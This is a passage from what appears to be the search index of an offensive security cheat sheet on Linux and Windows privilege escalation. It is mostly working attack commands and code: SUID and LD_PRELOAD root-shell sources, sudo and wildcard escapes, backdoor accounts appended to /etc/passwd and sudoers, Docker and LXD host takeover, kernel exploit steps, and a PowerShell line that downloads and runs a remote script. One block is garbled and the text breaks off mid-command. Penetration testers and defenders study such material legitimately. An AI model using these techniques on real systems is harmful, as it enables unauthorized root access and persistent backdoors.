Key","text":""},{"location":"privilege-escalation/linux/#sensitive-files","title":"Sensitive files","text":"<pre><code>find / -name authorized_keys 2&gt; /dev/null\nfind / -name id_rsa 2&gt; /dev/null\n...\n</code></pre>"},{"location":"privilege-escalation/linux/#ssh-key-predictable-prng-authorized_keys-process","title":"SSH Key Predictable PRNG (Authorized_Keys) Process","text":"<p>This module describes how to attempt to use an obtained authorized_keys file on a host system.</p> <p>Needed : SSH-DSS String from authorized_keys file</p> <p>Steps</p> <ol> <li>Get the authorized_keys file. An example of this file would look like so:</li> </ol> <pre><code>ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... \n</code></pre> <ol> <li>Since this is an ssh-dss key, we need to add that to our local copy of <code>/etc/ssh/ssh_config</code> and <code>/etc/ssh/sshd_config</code>:</li> </ol> <pre><code>echo \"PubkeyAcceptedKeyTypes=+ssh-dss\" &gt;&gt; /etc/ssh/ssh_config\necho \"PubkeyAcceptedKeyTypes=+ssh-dss\" &gt;&gt; /etc/ssh/sshd_config\n/etc/init.d/ssh restart\n</code></pre> <ol> <li>Get g0tmi1k's debian-ssh repository and unpack the keys:</li> </ol> <pre><code>git clone https://github.com/g0tmi1k/debian-ssh\ncd debian-ssh\ntar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2\n</code></pre> <ol> <li>Grab the first 20 or 30 bytes from the key file shown above starting with the <code>\"AAAA...\"</code> portion and grep the unpacked keys with it as:</li> </ol> <pre><code>grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'\ndsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub\n</code></pre> <ol> <li>IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do:</li> </ol> <pre><code>ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934\n</code></pre> <p>And you should connect without requiring a password. If stuck, the <code>-vvv</code> verbosity should provide enough details as to why.</p>"},{"location":"privilege-escalation/linux/#scheduled-tasks","title":"Scheduled tasks","text":""},{"location":"privilege-escalation/linux/#cron-jobs","title":"Cron jobs","text":"<p>Check if you have access with write permission on these files.  Check inside the file, to find other paths with write permissions.   </p> <pre><code>/etc/init.d\n/etc/cron*\n/etc/crontab\n/etc/cron.allow\n/etc/cron.d \n/etc/cron.deny\n/etc/cron.daily\n/etc/cron.hourly\n/etc/cron.monthly\n/etc/cron.weekly\n/etc/sudoers\n/etc/exports\n/etc/anacrontab\n/var/spool/cron\n/var/spool/cron/crontabs/root\ncrontab -l\nls -alh /var/spool/cron;\nls -al /etc/ | grep cron\nls -al /etc/cron*\ncat /etc/cron*\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny*\n</code></pre> <p>You can use pspy to detect a CRON job.</p> <pre><code># print both commands and file system events and scan procfs every 1000 ms (=1sec)\n./pspy64 -pf -i 1000 \n</code></pre>"},{"location":"privilege-escalation/linux/#systemd-timers","title":"Systemd timers","text":"<pre><code>systemctl list-timers --all\nNEXT                          LEFT     LAST                          PASSED             UNIT                         ACTIVATES\nMon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily.timer              apt-daily.service\nMon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago          apt-daily-upgrade.timer      apt-daily-upgrade.service\nMon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service\n3 timers listed.\n</code></pre>"},{"location":"privilege-escalation/linux/#suid","title":"SUID","text":"<p>SUID/Setuid stands for \"set user ID upon execution\", it is enabled by default in every Linux distributions. If a file with this bit is run, the uid will be changed by the owner one. If the file owner is <code>root</code>, the uid will be changed to <code>root</code> even if it was executed from user <code>bob</code>. SUID bit is represented by an <code>s</code>.</p> <pre><code>\u256d\u2500swissky@lab ~  \n\u2570\u2500$ ls /usr/bin/sudo -alh                  \n-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo\n</code></pre>"},{"location":"privilege-escalation/linux/#find-suid-binaries","title":"Find SUID binaries","text":"<pre><code>find / -perm -4000 -type f -exec ls -la {} 2&gt;/dev/null \\;\nfind / -uid 0 -perm -4000 -type f 2&gt;/dev/null\n</code></pre>"},{"location":"privilege-escalation/linux/#create-a-suid-binary","title":"Create a SUID binary","text":"Function Description setreuid() sets real and effective user IDs of the calling process setuid() sets the effective user ID of the calling process setgid() sets the effective group ID of the calling process <pre><code>print 'int main(void){\\nsetresuid(0, 0, 0);\\nsystem(\"/bin/sh\");\\n}' &gt; /tmp/suid.c   \ngcc -o /tmp/suid /tmp/suid.c  \nsudo chmod +x /tmp/suid # execute right\nsudo chmod +s /tmp/suid # setuid bit\n</code></pre>"},{"location":"privilege-escalation/linux/#capabilities","title":"Capabilities","text":""},{"location":"privilege-escalation/linux/#list-capabilities-of-binaries","title":"List capabilities of binaries","text":"<pre><code>\u256d\u2500swissky@lab ~  \n\u2570\u2500$ /usr/bin/getcap -r  /usr/bin\n/usr/bin/fping                = cap_net_raw+ep\n/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip\n/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep\n/usr/bin/rlogin               = cap_net_bind_service+ep\n/usr/bin/ping                 = cap_net_raw+ep\n/usr/bin/rsh                  = cap_net_bind_service+ep\n/usr/bin/rcp                  = cap_net_bind_service+ep\n</code></pre>"},{"location":"privilege-escalation/linux/#edit-capabilities","title":"Edit capabilities","text":"<pre><code>/usr/bin/setcap -r /bin/ping            # remove\n/usr/bin/setcap cap_net_raw+p /bin/ping # add\n</code></pre>"},{"location":"privilege-escalation/linux/#interesting-capabilities","title":"Interesting capabilities","text":"<p>Having the capability =ep means the binary has all the capabilities. <pre><code>$ getcap openssl /usr/bin/openssl \nopenssl=ep\n</code></pre></p> <p>Alternatively the following capabilities can be used in order to upgrade your current privileges.</p> <pre><code>cap_dac_read_search # read anything\ncap_setuid+ep # setuid\n</code></pre> <p>Example of privilege escalation with <code>cap_setuid+ep</code></p> <pre><code>$ sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7\n$ python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'\nsh-5.0# id\nuid=0(root) gid=1000(swissky)\n</code></pre> Capabilities name Description CAP_AUDIT_CONTROL Allow to enable/disable kernel auditing CAP_AUDIT_WRITE Helps to write records to kernel auditing log CAP_BLOCK_SUSPEND This feature can block system suspends CAP_CHOWN Allow user to make arbitrary change to files UIDs and GIDs CAP_DAC_OVERRIDE This helps to bypass file read, write and execute permission checks CAP_DAC_READ_SEARCH This only bypasses file and directory read/execute permission checks CAP_FOWNER This enables bypass of permission checks on operations that normally require the filesystem UID of the process to match the UID of the file CAP_KILL Allow the sending of signals to processes belonging to others CAP_SETGID Allow changing of the GID CAP_SETUID Allow changing of the UID CAP_SETPCAP Helps to transferring and removal of current set to any PID CAP_IPC_LOCK This helps to lock memory CAP_MAC_ADMIN Allow MAC configuration or state changes CAP_NET_RAW Use RAW and PACKET sockets CAP_NET_BIND_SERVICE SERVICE Bind a socket to internet domain privileged ports"},{"location":"privilege-escalation/linux/#sudo","title":"SUDO","text":"<p>Tool: Sudo Exploitation</p>"},{"location":"privilege-escalation/linux/#nopasswd","title":"NOPASSWD","text":"<p>Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.</p> <pre><code>$ sudo -l\n\nUser demo may run the following commands on crashlab:\n    (root) NOPASSWD: /usr/bin/vim\n</code></pre> <p>In this example the user <code>demo</code> can run <code>vim</code> as <code>root</code>, it is now trivial to get a shell by adding an ssh key into the root directory or by calling <code>sh</code>.</p> <pre><code>sudo vim -c '!sh'\nsudo -u root vim -c '!sh'\n</code></pre>"},{"location":"privilege-escalation/linux/#ld_preload-and-nopasswd","title":"LD_PRELOAD and NOPASSWD","text":"<p>If <code>LD_PRELOAD</code> is explicitly defined in the sudoers file</p> <pre><code>Defaults        env_keep += LD_PRELOAD\n</code></pre> <p>Compile the following shared object using the C code below with <code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setgid(0);\n    setuid(0);\n    system(\"/bin/sh\");\n}\n</code></pre> <p>Execute any binary with the LD_PRELOAD to spawn a shell : <code>sudo LD_PRELOAD=&lt;full_path_to_so_file&gt; &lt;program&gt;</code>, e.g: <code>sudo LD_PRELOAD=/tmp/shell.so find</code></p>"},{"location":"privilege-escalation/linux/#doas","title":"Doas","text":"<p>There are some alternatives to the <code>sudo</code> binary such as <code>doas</code> for OpenBSD, remember to check its configuration at <code>/etc/doas.conf</code></p> <pre><code>permit nopass demo as root cmd vim\n</code></pre>"},{"location":"privilege-escalation/linux/#sudo_inject","title":"sudo_inject","text":"<p>Using https://github.com/nongiach/sudo_inject</p> <pre><code>$ sudo whatever\n[sudo] password for user:    \n# Press &lt;ctrl&gt;+c since you don't have the password. \n# This creates an invalid sudo tokens.\n$ sh exploit.sh\n.... wait 1 seconds\n$ sudo -i # no password required :)\n# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>Slides of the presentation : https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf</p>"},{"location":"privilege-escalation/linux/#cve-2019-14287","title":"CVE-2019-14287","text":"<pre><code># Exploitable when a user have the following permissions (sudo -l)\n(ALL, !root) ALL\n# If you have a full TTY, you can exploit it like this\nsudo -u#-1 /bin/bash\nsudo -u#4294967295 id\n</code></pre>"},{"location":"privilege-escalation/linux/#gtfobins","title":"GTFOBins","text":"<p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p> <p>The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.</p> <p>gdb -nx -ex '!sh' -ex quit   sudo mysql -e '! /bin/sh'   strace -o /dev/null /bin/sh   sudo awk 'BEGIN {system(\"/bin/sh\")}'</p>"},{"location":"privilege-escalation/linux/#wildcard","title":"Wildcard","text":"<p>By using tar with \u2013checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. \u201cTricking\u201d root to use the specific options is quite easy, and that's where the wildcard comes in handy.</p> <pre><code># create file for exploitation\ntouch -- \"--checkpoint=1\"\ntouch -- \"--checkpoint-action=exec=sh shell.sh\"\necho \"#\\!/bin/bash\\ncat /etc/passwd &gt; /tmp/flag\\nchmod 777 /tmp/flag\" &gt; shell.sh\n# vulnerable script\ntar cf archive.tar *\n</code></pre> <p>Tool: wildpwn</p>"},{"location":"privilege-escalation/linux/#writable-files","title":"Writable files","text":"<p>List world writable files on the system.</p> <pre><code>find / -writable ! -user `whoami` -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \\; 2&gt;/dev/null\nfind / -perm -2 -type f 2&gt;/dev/null\nfind / ! -path \"*/proc/*\" -perm -2 -type f -print 2&gt;/dev/null\n</code></pre>"},{"location":"privilege-escalation/linux/#writable-etcsysconfignetwork-scripts-centosredhat","title":"Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)","text":"<p>/etc/sysconfig/network-scripts/ifcfg-1337 for example</p> <p><pre><code>NAME=Network /bin/id  &amp;lt;= Note the blank space\nONBOOT=yes\nDEVICE=eth0\nEXEC :\n./etc/sysconfig/network-scripts/ifcfg-1337\n</code></pre> src : https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&amp;qid=e026a0c5f83df4fd532442e1324ffa4f</p>"},{"location":"privilege-escalation/linux/#writable-etcpasswd","title":"Writable /etc/passwd","text":"<p>First generate a password with one of the following commands.</p> <pre><code>openssl passwd -1 -salt hacker hacker\nmkpasswd -m SHA-512 hacker\npython2 -c 'import crypt; print crypt.crypt(\"hacker\", \"$6$salt\")'\n</code></pre> <p>Then add the user <code>hacker</code> and add the generated password.</p> <pre><code>hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash\n</code></pre> <p>E.g: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p> <p>You can now use the <code>su</code> command with <code>hacker:hacker</code></p> <p>Alternatively you can use the following lines to add a dummy user without a password.   WARNING: you might degrade the current security of the machine.</p> <pre><code>echo 'dummy::0:0::/root:/bin/bash' &gt;&gt;/etc/passwd\nsu - dummy\n</code></pre> <p>NOTE: In BSD platforms <code>/etc/passwd</code> is located at <code>/etc/pwd.db</code> and <code>/etc/master.passwd</code>, also the <code>/etc/shadow</code> is renamed to <code>/etc/spwd.db</code>. </p>"},{"location":"privilege-escalation/linux/#writable-etcsudoers","title":"Writable /etc/sudoers","text":"<pre><code>echo \"username ALL=(ALL:ALL) ALL\"&gt;&gt;/etc/sudoers\n# use SUDO without password\necho \"username ALL=(ALL) NOPASSWD: ALL\" &gt;&gt;/etc/sudoers\necho \"username ALL=NOPASSWD: /bin/bash\" &gt;&gt;/etc/sudoers\n</code></pre>"},{"location":"privilege-escalation/linux/#nfs-root-squashing","title":"NFS Root Squashing","text":"<p>When no_root_squash appears in <code>/etc/exports</code>, the folder is shareable and a remote user can mount it.</p> <pre><code># remote check the name of the folder\nshowmount -e 10.10.10.10\n# create dir\nmkdir /tmp/nfsdir  \n# mount directory \nmount -t nfs 10.10.10.10:/shared /tmp/nfsdir    \ncd /tmp/nfsdir\n# copy wanted shell \ncp /bin/bash .  \n# set suid permission\nchmod +s bash   \n</code></pre>"},{"location":"privilege-escalation/linux/#shared-library","title":"Shared Library","text":""},{"location":"privilege-escalation/linux/#ldconfig","title":"ldconfig","text":"<p>Identify shared libraries with <code>ldd</code></p> <pre><code>$ ldd /opt/binary\n    linux-vdso.so.1 (0x00007ffe961cd000)\n    vulnlib.so.8 =&gt; /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)\n    /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c8000)        \n</code></pre> <p>Create a library in <code>/tmp</code> and activate the path.</p> <pre><code>gcc \u2013Wall \u2013fPIC \u2013shared \u2013o vulnlib.so /tmp/vulnlib.c\necho \"/tmp/\" &gt; /etc/ld.so.conf.d/exploit.conf &amp;&amp; ldconfig -l /tmp/vulnlib.so\n/opt/binary\n</code></pre>"},{"location":"privilege-escalation/linux/#rpath","title":"RPATH","text":"<pre><code>level15@nebula:/home/flag15$ readelf -d flag15 | egrep \"NEEDED|RPATH\"\n 0x00000001 (NEEDED)                     Shared library: [libc.so.6]\n 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]\nlevel15@nebula:/home/flag15$ ldd ./flag15 \n linux-gate.so.1 =&gt;  (0x0068c000)\n libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x00110000)\n /lib/ld-linux.so.2 (0x005bb000)\n</code></pre> <p>By copying the lib into <code>/var/tmp/flag15/</code> it will be used by the program in this place as specified in the <code>RPATH</code> variable.</p> <pre><code>level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/\nlevel15@nebula:/home/flag15$ ldd ./flag15 \n linux-gate.so.1 =&gt;  (0x005b0000)\n libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00110000)\n /lib/ld-linux.so.2 (0x00737000)\n</code></pre> <p>Then create an evil library in <code>/var/tmp</code> with <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p> <pre><code>#include&lt;stdlib.h&gt;\n#define SHELL \"/bin/sh\"\nint __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))\n{\n char *file = SHELL;\n char *argv[] = {SHELL,0};\n setresuid(geteuid(),geteuid(), geteuid());\n execve(file,argv,0);\n}\n</code></pre>"},{"location":"privilege-escalation/linux/#groups","title":"Groups","text":""},{"location":"privilege-escalation/linux/#docker","title":"Docker","text":"<p>Mount the filesystem in a bash container, allowing you to edit the <code>/etc/passwd</code> as root, then add a backdoor account <code>toor:password</code>.</p> <pre><code>$&gt; docker run -it --rm -v $PWD:/mnt bash\n$&gt; echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' &gt;&gt; /mnt/etc/passwd\n</code></pre> <p>Almost similar but you will also see all processes running on the host and be connected to the same NICs.</p> <pre><code>docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash\n</code></pre> <p>Or use the following docker image from chrisfosterelli to spawn a root shell</p> <pre><code>$ docker run -v /:/hostOS -i -t chrisfosterelli/rootplease\nlatest: Pulling from chrisfosterelli/rootplease\n2de59b831a23: Pull complete \n354c3661655e: Pull complete \n91930878a2d7: Pull complete \na3ed95caeb02: Pull complete \n489b110c54dc: Pull complete \nDigest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0\nStatus: Downloaded newer image for chrisfosterelli/rootplease:latest\nYou should now have a root shell on the host OS\nPress Ctrl-D to exit the docker instance / shell\nsh-5.0# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>More docker privilege escalation using the Docker Socket.</p> <pre><code>sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash\nsudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh\n</code></pre>"},{"location":"privilege-escalation/linux/#lxclxd","title":"LXC/LXD","text":"<p>The privesc requires to run a container with elevated privileges and mount the host filesystem inside.</p> <pre><code>\u256d\u2500swissky@lab ~  \n\u2570\u2500$ id\nuid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power),110(lxd),991(lp),998(wheel)\n</code></pre> <p>Build an Alpine image and start it using the flag <code>security.privileged=true</code>, forcing the container to interact as root with the host filesystem.</p> <pre><code># build a simple alpine image\ngit clone https://github.com/saghul/lxd-alpine-builder\n./build-alpine -a i686\n# import the image\nlxc image import ./alpine.tar.gz --alias myimage\n# run the image\nlxc init myimage mycontainer -c security.privileged=true\n# mount the /root into the image\nlxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true\n# interact with the container\nlxc start mycontainer\nlxc exec mycontainer /bin/sh\n</code></pre> <p>Alternatively https://github.com/initstring/lxd_root</p>"},{"location":"privilege-escalation/linux/#hijack-tmux-session","title":"Hijack TMUX session","text":"<p>Require a read access to the tmux socket : <code>/tmp/tmux-1000/default</code>.</p> <pre><code>export TMUX=/tmp/tmux-1000/default,1234,0 \ntmux ls\n</code></pre>"},{"location":"privilege-escalation/linux/#kernel-exploits","title":"Kernel Exploits","text":"<p>Precompiled exploits can be found inside these repositories, run them at your own risk ! * bin-sploits - @offensive-security * kernel-exploits - @lucyoa</p> <p>The following exploits are known to work well, search for more exploits with <code>searchsploit -w linux kernel centos</code>.</p> <p>Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing <code>uname -a</code> Copy the kernel version and distribution, and search for it in google or in https://www.exploit-db.com/.</p>"},{"location":"privilege-escalation/linux/#cve-2022-0847-dirtypipe","title":"CVE-2022-0847 (DirtyPipe)","text":"<p>Linux Privilege Escalation - Linux Kernel 5.8 &lt; 5.16.11</p> <pre><code>https://www.exploit-db.com/exploits/50808\n</code></pre>"},{"location":"privilege-escalation/linux/#cve-2016-5195-dirtycow","title":"CVE-2016-5195 (DirtyCow)","text":"<p>Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p> <pre><code># make dirtycow stable\necho 0 &gt; /proc/sys/vm/dirty_writeback_centisecs\ng++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil\nhttps://github.com/dirtycow/dirtycow.github.io/wiki/PoCs\nhttps://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c\n</code></pre>"},{"location":"privilege-escalation/linux/#cve-2010-3904-rds","title":"CVE-2010-3904 (RDS)","text":"<p>Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p> <pre><code>https://www.exploit-db.com/exploits/15285/\n</code></pre>"},{"location":"privilege-escalation/linux/#cve-2010-4258-full-nelson","title":"CVE-2010-4258 (Full Nelson)","text":"<p>Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)</p> <pre><code>https://www.exploit-db.com/exploits/15704/\n</code></pre>"},{"location":"privilege-escalation/linux/#cve-2012-0056-mempodipper","title":"CVE-2012-0056 (Mempodipper)","text":"<p>Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p> <pre><code>https://www.exploit-db.com/exploits/18411\n</code></pre>"},{"location":"privilege-escalation/linux/#references","title":"References","text":"<ul> <li>SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m</li> <li>Privilege escalation via Docker - April 22, 2015 - Chris Foster</li> <li>An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018</li> <li>Exploiting wildcards on Linux - Berislav Kucan</li> <li>Code Execution With Tar Command - p4pentest</li> <li>Back To The Future: Unix Wildcards Gone Wild - Leon Juranic</li> <li>HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018</li> <li>Privilege Escalation via lxd - @reboare</li> <li>Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018</li> <li>Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc</li> <li>Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates</li> <li>Local Privilege Escalation Workshop - Slides.pdf - @sagishahar</li> <li>SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs</li> <li>The Dirty Pipe Vulnerability</li> </ul>"},{"location":"privilege-escalation/windows/","title":"Windows - Privilege Escalation","text":""},{"location":"privilege-escalation/windows/#summary","title":"Summary","text":"<ul> <li>Tools</li> <li>Windows Version and Configuration</li> <li>User Enumeration</li> <li>Network Enumeration</li> <li>Antivirus Enumeration</li> <li>Default Writeable Folders</li> <li>EoP - Looting for passwords<ul> <li>SAM and SYSTEM files</li> <li>HiveNightmare</li> <li>LAPS Settings</li> <li>Search for file contents</li> <li>Search for a file with a certain filename</li> <li>Search the registry for key names and passwords</li> <li>Passwords in unattend.xml</li> <li>Wifi passwords</li> <li>Sticky Notes passwords</li> <li>Passwords stored in services</li> <li>Passwords stored in Key Manager</li> <li>Powershell History</li> <li>Powershell Transcript</li> <li>Password in Alternate Data Stream</li> </ul> </li> <li>EoP - Processes Enumeration and Tasks</li> <li>EoP - Incorrect permissions in services</li> <li>EoP - Windows Subsystem for Linux (WSL)</li> <li>EoP - Unquoted Service Paths</li> <li>EoP - $PATH Interception</li> <li>EoP - Named Pipes</li> <li>EoP - Kernel Exploitation</li> <li>EoP - Microsoft Windows Installer<ul> <li>AlwaysInstallElevated</li> <li>CustomActions</li> </ul> </li> <li>EoP - Insecure GUI apps</li> <li>EoP - Evaluating Vulnerable Drivers</li> <li>EoP - Printers<ul> <li>Universal Printer</li> <li>Bring Your Own Vulnerability</li> </ul> </li> <li>EoP - Runas</li> <li>EoP - Abusing Shadow Copies</li> <li>EoP - From local administrator to NT SYSTEM</li> <li>EoP - Living Off The Land Binaries and Scripts</li> <li>EoP - Impersonation Privileges<ul> <li>Restore A Service Account's Privileges</li> <li>Meterpreter getsystem and alternatives</li> <li>RottenPotato (Token Impersonation)</li> <li>Juicy Potato (Abusing the golden privileges)</li> <li>Rogue Potato (Fake OXID Resolver))</li> <li>EFSPotato (MS-EFSR EfsRpcOpenFileRaw))</li> <li>PrintSpoofer (Printer Bug)))</li> </ul> </li> <li>EoP - Privileged File Write<ul> <li>DiagHub</li> <li>UsoDLLLoader</li> <li>WerTrigger</li> <li>WerMgr</li> </ul> </li> <li>EoP - Privileged File Delete</li> <li>EoP - Common Vulnerabilities and Exposures<ul> <li>MS08-067 (NetAPI)</li> <li>MS10-015 (KiTrap0D)</li> <li>MS11-080 (adf.sys)</li> <li>MS15-051 (Client Copy Image)</li> <li>MS16-032</li> <li>MS17-010 (Eternal Blue)</li> <li>CVE-2019-1388</li> </ul> </li> <li>EoP - $PATH Interception</li> <li>References</li> </ul>"},{"location":"privilege-escalation/windows/#tools","title":"Tools","text":"<ul> <li>PowerSploit's PowerUp <pre><code>powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks\n</code></pre></li> <li>Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock</li> <li>(Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities <pre><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1\n</code></pre></li> <li>BeRoot - Privilege Escalation Project - Windows / Linux / Mac</li> <li>Windows-Exploit-Suggester <pre><code>./windows-exploit-suggester.py --update\n./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt \n</code></pre></li> <li>windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems</li> <li>WindowsExploits - Windows exploits, mostly precompiled. Not being updated.</li> <li>WindowsEnum - A Powershell Privilege Escalation Enumeration Script.</li> <li>Seatbelt - A C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives. <pre><code>Seatbelt.exe -group=all -full\nSeatbelt.exe -group=system -outputfile=\"C:\\Temp\\system.txt\"\nSeatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\\sam -password=\"yum \\\"po-ta-toes\\\"\"\n</code></pre></li> <li>Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind</li> <li>JAWS - Just Another Windows (Enum) Script <pre><code>powershell.exe -ExecutionPolicy Bypass -File .\\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt\n</code></pre></li> <li>winPEAS - Windows Privilege Escalation Awesome Script</li> <li>Windows Exploit Suggester - Next Generation (WES-NG) <pre><code># First obtain systeminfo\nsysteminfo\nsysteminfo &gt; systeminfo.txt\n# Then feed it to wesng\npython3 wes.py --update-wes\npython3 wes.py --update\npython3 wes.py systeminfo.txt\n</code></pre></li> <li>PrivescCheck - Privilege Escalation Enumeration Script for Windows <pre><code>C:\\Temp\\&gt;powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\"\nC:\\Temp\\&gt;powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended\"\nC:\\Temp\\&gt;powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML\"\n</code></pre></li> </ul>"},{"location":"privilege-escalation/windows/#windows-version-and-configuration","title":"Windows Version and Configuration","text":"<pre><code>systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\n</code></pre> <p>Extract patchs and updates <pre><code>wmic qfe\n</code></pre></p> <p>Architecture</p> <pre><code>wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%\n</code></pre> <p>List all env variables</p> <pre><code>set\nGet-ChildItem Env: | ft Key,Value\n</code></pre> <p>List all drives</p> <pre><code>wmic logicaldisk get caption || fsutil fsinfo drives\nwmic logicaldisk get caption,description,providername\nGet-PSDrive | where {$_.Provider -like \"Microsoft.PowerShell.Core\\FileSystem\"}| ft Name,Root\n</code></pre>"},{"location":"privilege-escalation/windows/#user-enumeration","title":"User Enumeration","text":"<p>Get current username</p> <pre><code>echo %USERNAME% || whoami\n$env:username\n</code></pre> <p>List user privilege</p> <pre><code>whoami /priv\nwhoami /groups\n</code></pre> <p>List all users</p> <pre><code>net user\nwhoami /all\nGet-LocalUser | ft Name,Enabled,LastLogon\nGet-ChildItem C:\\Users -Force | select Name\n</code></pre> <p>List logon requirements; useable for bruteforcing</p> <p>```powershell$env:usernadsc net accounts <pre><code>Get details about a user (i.e. administrator, admin, current user)\n\n```powershell\nnet user administrator\nnet user admin\nnet user %USERNAME%\n</code></pre></p> <p>List all local groups</p> <pre><code>net localgroup\nGet-LocalGroup | ft Name\n</code></pre> <p>Get details about a group (i.e. administrators)</p> <pre><code>net localgroup administrators\nGet-LocalGroupMember Administrators | ft Name, PrincipalSource\nGet-LocalGroupMember Administrateurs | ft Name, PrincipalSource\n</code></pre> <p>Get Domain Controllers</p> <pre><code>nltest /DCLIST:DomainName\nnltest /DCNAME:DomainName\nnltest /DSGETDC:DomainName\n</code></pre>"},{"location":"privilege-escalation/windows/#network-enumeration","title":"Network Enumeration","text":"<p>List all network interfaces, IP, and DNS.</p> <pre><code>ipconfig /all\nGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address\nGet-DnsClientServerAddress -AddressFamily IPv4 | ft\n</code></pre> <p>List current routing table</p> <pre><code>route print\nGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex\n</code></pre> <p>List the ARP table</p> <pre><code>arp -A\nGet-NetNeighbor -AddressFamily IPv4 | ft 